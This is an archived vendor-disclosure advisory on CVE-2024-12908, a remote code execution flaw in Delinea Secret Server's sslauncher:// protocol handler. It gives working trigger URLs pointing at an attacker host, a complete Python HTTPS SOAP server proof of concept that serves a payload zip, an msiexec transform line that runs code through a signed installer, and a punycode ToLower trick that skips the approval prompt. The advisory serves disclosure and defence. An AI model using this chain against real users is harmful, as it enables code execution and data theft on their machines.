---
type: Advisory
title: Delinea Protocol Handler - Remote Code Execution via Update Process (CVE-2024-12908)
description: "The sslauncher:// URI handler takes an ssurl parameter and, with autoUpdateEnabled=true, fetches an update over SOAP from that host, extracts the returned zip and runs its setup.bat msiexec line. The MSI must be Delinea-signed, but arbitrary msiexec parameters are honoured, so a bundled .mst transform rewrites the signed installer at runtime and executes code. ToLower() folds a punycode dotted capital I to i, so the approval prompt is skipped."
resource: "https://blog.amberwolf.com/blog/2024/december/cve-2024-12908-delinea-protocol-handler---remote-code-execution-via-update-process/"
tags: [advisory, webseclist-reference, blog-amberwolf-com, rce, cve, parser-differential, unicode, url-parsing, dotnet, soap, abuse-of-functionality, owasp-a04-2021]
generated:
  by: webseclist-refs/1
  at: "2026-08-10T15:03:58+00:00"
status: stable
stale_after: 2027-08-10
sources:
  - id: original
    resource: "https://blog.amberwolf.com/blog/2024/december/cve-2024-12908-delinea-protocol-handler---remote-code-execution-via-update-process/"
    title: Delinea Protocol Handler - Remote Code Execution via Update Process (CVE-2024-12908)
    author: David Cash, Richard Warren
also_at: []
authors:
  - David Cash
  - Richard Warren
canonical_url: ""
cited_by:
  - "2024.md:115"
commit: ""
content_sha256: bd81cc0c717d8501f3db241bfcad77c15af121f8524db96b239703ca3aa8786f
depth: full
depth_reason: default
kind: advisory
language: ""
licence: unknown
original_url: "https://blog.amberwolf.com/blog/2024/december/cve-2024-12908-delinea-protocol-handler---remote-code-execution-via-update-process/"
published: ""
publisher: blog.amberwolf.com
publisher_english: ""
raw_sha256: f460f82c3330fc61c73017d2e991ab5918d463702308a4071e2e61fea4aa8dbb
retrieved_from: "https://blog.amberwolf.com/blog/2024/december/cve-2024-12908-delinea-protocol-handler---remote-code-execution-via-update-process/"
retrieved_kind: live
retrieved_utc: "2026-08-10T15:03:58+00:00"
slug: blog-amberwolf-com-delinea-protocol-handler-remote-code-execution-update-12908
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# Delinea Protocol Handler - Remote Code Execution via Update Process (CVE-2024-12908)

**Delinea Protocol Handler - Remote Code Execution via Update Process (CVE-2024-12908)** - David Cash, Richard Warren, blog.amberwolf.com.

- Published: date not stated
- Original: <https://blog.amberwolf.com/blog/2024/december/cve-2024-12908-delinea-protocol-handler---remote-code-execution-via-update-process/>
- Preserved from: https://blog.amberwolf.com/blog/2024/december/cve-2024-12908-delinea-protocol-handler---remote-code-execution-via-update-process/ (live) on 2026-08-10
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

## Delinea Protocol Handler - Remote Code Execution via Update Process (CVE-2024-12908)

- [ ![David Cash](https://blog.amberwolf.com/images/author/david-cash_huc44cc0bdaa36d141a2cd1065530b9a4e_104845_52x52_fill_q100_h2_lanczos_smart1.webp) David Cash](https://blog.amberwolf.com/author/david-cash/)
- [ ![Richard Warren](https://blog.amberwolf.com/images/author/richard-warren_huc44cc0bdaa36d141a2cd1065530b9a4e_101278_52x52_fill_q100_h2_lanczos_smart1.webp) Richard Warren](https://blog.amberwolf.com/author/richard-warren/)
- |
- 26 December 2024

#### Summary

The Secret Server Protocol Handler facilitates communication between Secret Server and the client machine. It also provides the necessary files for the launchers to function. When a user initiates a launcher, the protocol handler:

- Bootstraps the client-side application.
- Communicates with Secret Server over HTTP(S) to ensure it is the latest version and initiates an upgrade if necessary.
- Bootstraps the target launcher type and begins the process of securely logging in the user.

The Delinea Protocol Handler suffers from a Remote Code Execution vulnerability in the sslauncher URL handler. This could be exploited by a malicious actor to execute arbitrary code on a user’s machine.

#### Impact

A remote attacker may be able to convince a user to visit a malicious web-page, or open a malicious document which could trigger the vulnerable URL handler, allowing them to execute arbitrary code on the user’s machine. This could allow the attacker to install malware, exfiltrate data or otherwise gain remote access into the network.

#### Affected Versions

6.0.3.28 Release notes for Secret Server 11.7 state that: “If your protocol handler version is 6.0.3.26 or lower, you must manually upgrade to a higher version. Automatic upgrades will not work for versions 6.0.3.26 or below. However, if your protocol handler version is 6.0.3.27 or higher, the automatic upgrade will function properly.” As the vulnerability uses the auto update feature, older versions may not be affected.

#### Timeline

- 2024-09-09: Vulnerability reported to Delinea
- 2024-09-10: Acknowledgement received from Delinea
- 2024-11-28: AmberWolf informed that the issue was patched in Secret Server 11.7.000049
- 2024-12-26: AmberWolf advisory published.

#### Description

The Delinea Secret Server Protocol Handler software registers a custom URI handler with a scheme of sslauncher://

 ![](https://blog.amberwolf.com/blog/2024/december/cve-2024-12908-delinea-protocol-handler---remote-code-execution-via-update-process/images/cef58cd0-ea1b-4f3e-95db-94f02a83daac_hue36e19527b4d57c5a6823eced869857b_8145_1252x95_resize_q100_h2_lanczos_3.webp)

*image*

The screenshot below shows the handler being invoked via Edge:

 ![](https://blog.amberwolf.com/blog/2024/december/cve-2024-12908-delinea-protocol-handler---remote-code-execution-via-update-process/images/48bd8f1f-7191-4c50-a315-7aed08fd6808_hue559a907d5ebcdb8b48dd3a0912bba9e_60335_766x235_resize_q100_h2_lanczos_3.webp)

*image*

This results in the following process being started:

```plain
"C:\Program Files\Thycotic Software Ltd\Secret Server Protocol Handler\RDPWin.Bootstrapper.exe" "sslauncher://aaaa/"

```

The Main() function of the RDPWin.Bootstrapper.exe receives the program argument and begins by checking for disallowed characters:

```cs
    public List<string> GetDisallowedQueryStringParameters()
        {
            Regex regex = new Regex("^[a-zA-Z0-9\\.-]+$", RegexOptions.Compiled | RegexOptions.Singleline);
            List<string> list = new List<string>();
            foreach (string text in base.Keys)
            {
                if (!regex.IsMatch(text))
                {
                    list.Add(text);
                }
            }
            return list;
        }

```

This results in the rejection of arguments that contain special characters. The validation continues with a check against a list of accepted parameters within the sslauncher URL:

```cs
private readonly List<string> _knownQueryStringParameters = new List<string> { "ssurl", "guid", "type", "sessionGuid", "apiVersion", "autoUpdateEnabled" };

public List<string> GetUnknownQueryStringParameters()
        {
            List<string> list = new List<string>();
            foreach (string text in base.Keys)
            {
                if (!this._knownQueryStringParameters.Contains(text, StringComparer.OrdinalIgnoreCase))
                {
                    list.Add(text);
                }
            }
            return list;
        }

```

So for example, the following would be rejected:

```plain
sslauncher://aaaa/?badparameter=bbb

```

But this would be accepted:

```plain
sslauncher://aaaa/?ssurl=bbb

```

The next validation step checks whether the ssurl parameter has been supplied, that it can be used to create a valid Uri object and has a path that contains at least three subdirectories:

```cs
    if (!queryStringInfo.TryGetValue("ssurl", out text5) || !Uri.TryCreate(text5, UriKind.Absolute, out uri))
                    {
                        Program.Log.Error("No valid Secret Server URL provided");
                        IoC.Resolve<IMessageBox>().Show("The Secret Server Launcher failed to load.\n\nNo valid Secret Server URL was provided.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    }

```

So our sslauncher value now has to look something like this:

```plain
sslauncher://aaaa/?ssurl=https://www.attacker.com/aaa/bbb/ccc

```

This is followed by a check against a registry setting to determine whether domain allow listing has been configured:

```cs
if (allowedDomains != null && allowedDomains.Count > 0 && !registrySettings.AllowedDomains.Contains(uri.Host, StringComparer.OrdinalIgnoreCase))
                        {
                            Program.Log.Error("AllowedDomains registry key does not allow connecting to host at " + uri.Host + ", quitting.");
                            IoC.Resolve<IMessageBox>().Show("The Secret Server Launcher failed to load.\n\nYour configuration settings do not allow connecting to the Secret Server installation at " + uri.Host + ".", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                        }

```

In a default installation of the protocol handler, this registry value is null so the check is skipped and the code progresses to a TLS certificate check on the domain supplied in the ssurl parameter:

```cs
    public bool GetAndVerifyCertificate()
        {
            string components = this._uri.GetComponents(UriComponents.SchemeAndServer, UriFormat.Unescaped);
            string text = string.Format("{0}/{1}", this._uri.GetComponents(UriComponents.SchemeAndServer, UriFormat.Unescaped), this._uri.GetComponents(UriComponents.Path, UriFormat.Unescaped));
            if (!string.Equals(this._uri.Scheme, "https", StringComparison.OrdinalIgnoreCase))
            {
                this._log.Warn("Could not validate HTTPS certificate: Secret Server URL is not HTTPS (" + text + ")");
                this._messageBox.Show("You must connect to Secret Server using HTTPS.\nCurrent URL: " + text + "\n\nFor assistance, please contact your administrator.\n\n", "HTTPS Validation Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return false;
            }
            ServicePointManager.CheckCertificateRevocationList = true;
            HttpWebRequest httpWebRequest = WebRequest.CreateHttp(components);
            httpWebRequest.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(this.CertificateValidator);
            httpWebRequest.AllowAutoRedirect = false;
            try
            {
                using (httpWebRequest.GetResponse())
                {
                }
            }
            catch (Exception ex)
            {
                if (this._sslPolicyErrors == null)
                {
                    this._log.Error("Unspecified error occurred when attempting to connect to Secret Server for HTTPS validation", ex);
                    this._messageBox.Show("Unable to connect to Secret Server to verify its HTTPS certificate:\n\n" + ex.Message + "\n\nPlease try again later.", "Unable to Connect", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    return false;
                }
                if (this._sslPolicyErrors.Value == SslPolicyErrors.None)
                {
                    this._log.Debug("HTTPS validation succeeded without error for " + components);
                    return true;
                }
                if (this.AreCurrentErrorsBypassed())
                {
                    return true;
                }
                return this.DisplayErrorsAndPrompt();
            }
            this._log.Debug("HTTPS validation succeeded without error for " + components);
            return true;
        }

```

This can be satisfied by obtaining a valid TLS certificate for a web server. Following this, the ssurl domain is compared against a list of previously validated domains that are stored in the following file:

```plain
%APPDATA%\Thycotic\SSUA.dat

```

Failing to match one of the previously approved domains results in a prompt similar to the image below. We’ll come back to bypassing this check later on.

 ![](https://blog.amberwolf.com/blog/2024/december/cve-2024-12908-delinea-protocol-handler---remote-code-execution-via-update-process/images/12d887e4-2a5d-458f-b11b-d99497c7eb23_hu587f7194401fd753dea6bfca2ef668ea_24410_410x259_resize_q100_h2_lanczos_3.webp)

*image*

Accepting this prompt moves on to a check for the presence of a boolean autoUpdateEnabled parameter in the sslauncher value, for example:

```plain
sslauncher://aaaa/?ssurl=https://www.attacker.com/aaa/bbb/ccc&autoUpdateEnabled=true

```

When set to true, this forces the code down a path that checks for an updated version of the software via the GetNextProtocolHandlerVersion, which makes a SOAP request to the URL defined in the ‘ssurl’ parameter:

```cs
    [SoapDocumentMethod("urn:thesecretserver.com/GetNextProtocolHandlerVersion", RequestNamespace = "urn:thesecretserver.com", ResponseNamespace = "urn:thesecretserver.com", Use = SoapBindingUse.Literal, ParameterStyle = SoapParameterStyle.Wrapped)]
        public string GetNextProtocolHandlerVersion(string existingVersion)
        {
            return (string)base.Invoke("GetNextProtocolHandlerVersion", new object[]
            {
                existingVersion
            })[0];
        }

```

The SOAP body appears as follows, calling the GetCurrentProtocolHandlerVersion method:

```xml
 <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><GetCurrentProtocolHandlerVersion xmlns="urn:thesecretserver.com" /></soap:Body></soap:Envelope>

```

The expected response contains a GetCurrentProtocolHandlerVersionResult value that informs the client what the latest version number of the SSProtocolHandler software.

```xml
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="                                                                                            http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/en                                                                                      velope/">
  <soap:Body>
    <GetCurrentProtocolHandlerVersionResponse xmlns="urn:thesecretserver.com">
      <GetCurrentProtocolHandlerVersionResult>9.9</GetCurrentProtocolHandlerVers                                                                                            ionResult>
    </GetCurrentProtocolHandlerVersionResponse>
  </soap:Body>
</soap:Envelope>

```

This version number is then compared with the currently installed version, followed by a registry check for the `Software\ThycoticProtocolHandler\ForceAutoUpdate` key. Again, this registry is not set by default so on a standard install of the protocol handler, automatic updates would be permitted.

If an update is required, the code proceeds to request a new version of the installer via a SOAP request to the same URL defined in the ssurl parameter via a call to the GetNewVersionMsi function, which checks the file extension and writes out the data in the response to a hard coded file name:

```cs
    public string GetNewVersionMsi(string url, string specificVersion = null)
        {
            string result;
            using (RdpWebService rdpWebService = new RdpWebService())
            {
                rdpWebService.Url = url;
                rdpWebService.UserAgent = WebserviceHandler.UserAgent.Value;
                byte[] array = (specificVersion != null) ? rdpWebService.GetSpecificVersion(specificVersion) : rdpWebService.GetNewVersion();
                string tempPath = Path.GetTempPath();
                string path;
                if (this.IsZipFile(array))
                {
                    path = "SSProtocolHandler.zip";
                }
                else
                {
                    path = "SSProtocolHandler.msi";
                }
                string text = Path.Combine(tempPath, path);
                File.Delete(text);
                File.WriteAllBytes(text, array);
                result = text;
            }
            return result;
        }

```

The byte[] array value is populated from the base64 decoded value of the GetNewVersionResult string, as shown in the sample SOAP response below:

```xml
'<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="                                                                                            http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/en                                                                                            velope/">
  <soap:Body>
    <GetNewVersionResponse xmlns="urn:thesecretserver.com">
      <GetNewVersionResult>UEsDBBQAAAAIAEyJCVl9vedCOwAAADwAAAAbAAAAU1NQcm90b2Nvb                                                                                            EhhbmRsZXIvc2V0dXAuYmF0yy3OTK1ITVbQz1TILc6MCQ4OKMovyU/Oz/FIzEvJSS3SA4oqhAQ5+gW7+                                                                                            Qf5BtsqJZcWl+TnAoVLlABQSwECFAAUAAAACABMiQlZfb3nQjsAAAA8AAAAGwAAAAAAAAABACAAAAAAA                                                                                            AAAU1NQcm90b2NvbEhhbmRsZXIvc2V0dXAuYmF0UEsFBgAAAAABAAEASQAAAHQAAAAAAA</GetNewVer                                                                                            sionResult>
    </GetNewVersionResponse>
  </soap:Body>
</soap:Envelope>

```

The application then makes a decision based on whether the resulting file is a .zip file, or a .msi. In the case that it is a zip file, the content is extracted to a temporary directory and the content of a the `SSProtocolHandler\setup.bat` file is read:

```cs
text5 = Path.Combine(tempPath, Guid.NewGuid().ToString());
                                            ZipFile.ExtractToDirectory(newVersionMsi, text5);
                                            text6 = Enumerable.FirstOrDefault<string>(File.ReadLines(Path.Combine(text5, "SSProtocolHandler", "setup.bat")));

```

A check for command chaining is performed:

```cs
    if (string.IsNullOrWhiteSpace(text6) || !text6.StartsWith("msiexec /i msi\\SSProtocolHandler.msi") || text6.Contains("&"))
                                            {
                                                Program.Log.Error("Invalid batch file command in downloaded update: " + text6);
                                                IoC.Resolve<IMessageBox>().Show("The Secret Server Launcher failed to load.\n\nAuto-update is enabled, but the downloaded update batch file is invalid. You may be the victim of a phishing attack.", "Invalid Update Downloaded", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                                                return;
                                            }

```

Then a string (text7) is defined that represents the full path of an MSI file that it expects has been extracted from the zip file:

```cs
text7 = Path.Combine(text5, "SSProtocolHandler", "msi", "SSProtocolHandler.msi");

```

Checks are performed on the MSI file to ensure that it has a valid signature from a specific Delinea authority, preventing the content from being modified before execution:

```cs
    bool flag5 = SignatureVerification.HasValidSignature(text7);
                                        bool flag6 = SignatureVerification.HasDelineaSignature(text7);

```

Rather than running the .bat file directly, the msiexec command line is extracted along with any custom parameters. It is then combined with the path of the MSI file (stored in text7) and passed to a Process.Start() argument:

```cs
    Process.Start(new ProcessStartInfo
                                            {
                                                FileName = "msiexec.exe",
                                                Arguments = "/i \"" + text7 + "\" " + array[3],
                                                UseShellExecute = false
                                            });

```

Although we are able to force the application to attempt to execute an arbitrary MSI file from the extracted zip, modifying the file would break the signature and prevent the file from being run. As it is possible to specify arbitrary parameters to the msiexec.exe command, it is possible to circumvent this by including a .MST file (an MSI transform) in the zip and referencing it in the command parameters:

```plain
msiexec /i msi\\SSProtocolHandler.msi TRANSFORMS="delinea.mst"

```

This causes msiexec to search for and apply the transform to the signed MSI, affecting it’s behaviour at runtime. As an example, the AdvancedInstaller tool was used to create a transform that ran a simple PowerShell script upon execution of the MSI.

The following proof of concept can be hosted with appropriate TLS certificates. Note that the zip content must contain an MSI file signed by Delinea - for the purpose of the demo, the SSSessionConnector installer ([https://updates.thycotic.net/secretserver/tools/SSSessionConnector.zip](https://updates.thycotic.net/secretserver/tools/SSSessionConnector.zip)) was renamed and used due to it being relatively small in size.

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import ssl
import logging
import base64

class SimpleSOAPHandler(BaseHTTPRequestHandler):
    def _set_headers(self, content_type="text/xml"):
        self.send_response(200)
        self.send_header('Content-type', content_type)
        self.end_headers()

    def do_GET(self):
        logging.info("GET request received. Path: %s", self.path)
        self._set_headers()
        self.wfile.write(b"GET request processed.")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])  # Get the size of data
        post_data = self.rfile.read(content_length)  # Read the data
        logging.info("POST request received. Path: %s", self.path)
        logging.info("POST request body:\n%s", post_data.decode('utf-8'))

        print("Reading in zip file")
        zip_file= open("payload.zip","rb")
        zip_data_binary = zip_file.read()
        zip_data = (base64.b64encode(zip_data_binary)).decode('ascii')
        # Check if the post_data matches the expected SOAP request
        if b"GetCurrentProtocolHandlerVersion" in post_data:
         response = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetCurrentProtocolHandlerVersionResponse xmlns="urn:thesecretserver.com">
      <GetCurrentProtocolHandlerVersionResult>9.9</GetCurrentProtocolHandlerVersionResult>
    </GetCurrentProtocolHandlerVersionResponse>
  </soap:Body>
</soap:Envelope>'''
         self._set_headers()
         self.wfile.write(response.encode('utf-8'))
        elif b"GetNewVersion" in post_data:
         print("New version requested")
         response = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetNewVersionResponse xmlns="urn:thesecretserver.com">
      <GetNewVersionResult>''' + zip_data + '''</GetNewVersionResult>
    </GetNewVersionResponse>
  </soap:Body>
</soap:Envelope>'''
         #print("Sending response: " + response)
         self._set_headers()
         self.wfile.write(response.encode('utf-8'))
        else:
         self.send_response(400)  # Bad request
         self.end_headers()

def run(server_class=HTTPServer, handler_class=SimpleSOAPHandler, port=443, cert_file="fullchain.pem", key_file="privkey.pem"):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)

    # SSL configuration using SSLContext
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=cert_file, keyfile=key_file)

    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

    logging.info('Starting https server on port %d...', port)
    httpd.serve_forever()

if __name__ == "__main__":
    run()

```

Zip content:

```plain
payload.zip
└───SSProtocolHandler
    │   delinea.mst
    │    setup.bat
    │
    └───msi
            delinea.mst
            SSProtocolHandler.msi

```

The content of the setup.bat file is as follows:

```plain
msiexec /i msi\\SSProtocolHandler.msi TRANSFORMS="delinea.mst"

```

To trigger the handler and run the MSI, the following URL can be used:

```plain
sslauncher://aaaaaaa/?ssurl=https://hostingdomain.com/aaaa/bbbb/cccc&autoUpdateEnabled=true&apiversion=1

```

##### Bypassing the warning

As we mentioned earlier, in some circumstances it is possible to bypass the approval dialog that a user would receive when using the protocol handler against a new domain.

The check for previously authorised domains can be bypassed in some circumstances by leveraging a parser differential between Uri and string objects in C#.

The code for checking whether the ssurl domain had been pre-approved was in the RDPWin.Business.dll, in the RDPWin.Bootstrapper.SecretServerUrlApprovalHelper.GetSecretServerUrlApproval() function, which took the ssurl domain as a string and compared it against values stored in %APPDATA%\Thycotic\SSUA.dat:

```cs

        public static SecretServerUrlApprovalBase GetSecretServerUrlApproval(string ssUrl)
        {
            IMessageBox messageBox = IoC.Resolve<IMessageBox>();
            ISecretServerUrlApprovalProvider secretServerUrlApprovalProvider = IoC.Resolve<ISecretServerUrlApprovalProvider>();
            string ssUrlBase = SecretServerUrlApprovalHelper.GetSecretServerUrlBase(ssUrl);
            if (ssUrlBase == null)
            {
                throw new ArgumentException("Invalid Secret Server URL: " + ssUrl);
            }
            SecretServerUrlApprovals secretServerUrlApprovals = secretServerUrlApprovalProvider.GetSecretServerUrlApprovals();
            SecretServerUrlApprovalBase secretServerUrlApprovalBase = secretServerUrlApprovals.Approvals.FirstOrDefault((SecretServerUrlApprovalBase approval) => approval.SecretServerUrl == ssUrlBase);
            if (secretServerUrlApprovalBase != null)
            {
                SecretServerUrlApprovalHelper._log.Debug("Existing host approval found for URL " + ssUrlBase);
                return secretServerUrlApprovalBase;
            }
            string messageText = "Secret Server Launcher is attempting to launch with the following Secret Server URL:\r\n\r\n    " + ssUrlBase + "\r\n\r\nIf you did not expect this launch attempt, or this Secret Server URL is incorrect, do not continue and contact a system administrator immediately.\r\n\r\nWas this launch expected and do you approve of this Secret Server URL?";
            DialogResult dialogResult = messageBox.Show(messageText, "Secret Server Launcher Attempt", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
            if (dialogResult == DialogResult.Cancel)
            {
                SecretServerUrlApprovalHelper._log.Debug("Canceled URL approval for " + ssUrlBase);
                return null;
            }
            SecretServerUrlApprovalBase secretServerUrlApprovalBase2 = new SecretServerUrlApprovalBase
            {
                SecretServerUrl = ssUrlBase,
                Approved = (dialogResult == DialogResult.Yes)
            };
            secretServerUrlApprovals.Approvals.Add(secretServerUrlApprovalBase2);
            secretServerUrlApprovalProvider.SaveSecretServerUrlApprovals(secretServerUrlApprovals);
            SecretServerUrlApprovalHelper._log.Debug("Added URL approval for " + ssUrlBase);
            return secretServerUrlApprovalBase2;
        }

```

There’s quite a lot going on in that function, so we’ll dig into each part. First of all the GetSecretServerUrlBase() function is called, with the ssurl value being passed to it. The purpose of this function is to normalise the domain from the URL prior to comparison. The code for this function is:

```cs
    public static string GetSecretServerUrlBase(string ssUrl)
        {
            string result;
            try
            {
                Uri uri = new Uri(ssUrl);
                string text = uri.GetLeftPart(UriPartial.Path);
                string leftPart = uri.GetLeftPart(UriPartial.Scheme);
                text = text.Substring(leftPart.Length);
                for (int i = 0; i < 3; i++)
                {
                    int length = text.LastIndexOf("/", StringComparison.Ordinal);
                    text = text.Substring(0, length);
                }
                text = leftPart + text;
                result = text.ToLower();
            }
            catch (Exception)
            {
                result = null;
            }
            return result;
        }

```

The ssurl string object is first converted to a Uri object before the domain is extracted and the ToLower() function is called to convert the string to lower case. Whilst this is good practice when performing a string comparison, experimentation showed that toLower() converts some unicode characters to different, ASCII representation.

A small test harness was used to run the whole unicode range of characters through the GetSecretServerUrlBase() function to determine any discrepancies between the input character and the result of the toLower() call. The following two characters appeared to be provide a useful substitution.

 ![](https://blog.amberwolf.com/blog/2024/december/cve-2024-12908-delinea-protocol-handler---remote-code-execution-via-update-process/images/8915108d-d03a-4d87-a8a0-5cf6c762b37f_hu3c586f65a2f8c2a3c9bf1e2b5c466175_2874_249x47_resize_q100_h2_lanczos_3.webp)

*image*

A punycode url could be generated that used the characters above, for example:

| Domain | Punycode encoded DNS | After toLower() |  |
| delİnea.com | xn–delinea-9he.com | delinea.com |  |

Registering xn–delinea-9he.com as a domain would allow the following payload to be created (assuming that the victim has already accepted company.delinea.com as an approved endpoint:

```plain
sslauncher://aaaaaaa/?ssurl=https://xn--delinea-9he.com/aaaa/bbbb/cccc&autoUpdateEnabled=true&apiversion=1

```

The root cause of the bypass is that:

Any web requests (for example to check for a new version, or fetch the updated MSI) are performed using a Uri object, which correctly processes the punycode encoded string and makes requests to the malicious delİnea.com site.

The string that is created as a result of the toLower() operation is used to perform the comparison with the list of approved sites. Because the U+0130 character is turned into a regular ‘i’, this would result in pass the comparison if the stored domain was delinea.com.

As a result, if an attacker was able to construct a URL with the punycode bypass above, the user would not be presented with the “Secret Server is attempting to launch the following URL” warning.

Delinea have released a patched version of the Protocol Handler (6.0.3.31) that prevents transforms from being loaded. This is detailed in the release notes for Secret Server version 11.7.000049:

[https://docs.delinea.com/online-help/secret-server/release-notes/ss-rn-11-7-000049.htm#SecretServer117000049ReleaseNotes](https://docs.delinea.com/online-help/secret-server/release-notes/ss-rn-11-7-000049.htm#SecretServer117000049ReleaseNotes)
